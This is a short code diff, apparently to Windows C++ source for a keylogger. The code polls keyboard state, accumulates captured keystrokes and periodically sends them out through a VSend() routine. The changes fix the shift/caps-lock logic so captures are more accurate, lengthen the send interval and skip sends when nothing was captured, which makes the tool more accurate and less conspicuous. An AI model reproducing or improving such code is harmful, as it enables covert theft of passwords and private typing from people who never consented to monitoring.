@@ -18,7 +18,7 @@ void VCheckKey(short vkey, bool shift);
 void VSend();
 void VErrorBox(const TCHAR* msg);
 
-const int V_SEND_INTERVAL = 2500;
+const int V_SEND_INTERVAL = 10000;
 const int V_IDLE_TIME = 1;
 
 const int V_KEY_BEGIN   = 0x09; // [BACK]
@@ -117,13 +117,16 @@ void VRun()
 
 		if(ticksNow - ticksLast >= V_SEND_INTERVAL)
 		{
-            VSend();
-            keysPressed.clear();
 			ticksLast = GetTickCount();
+            if (!keysPressed.empty())
+            {
+                VSend();
+                keysPressed.clear();
+            }
 		}
 
-        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0
-                    ^ (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+        bool shift = ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0)
+                    ^ ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 		for(int i = V_KEY_BEGIN; i <= V_KEY_END; i++)
 		{
 			VCheckKey(i, shift);
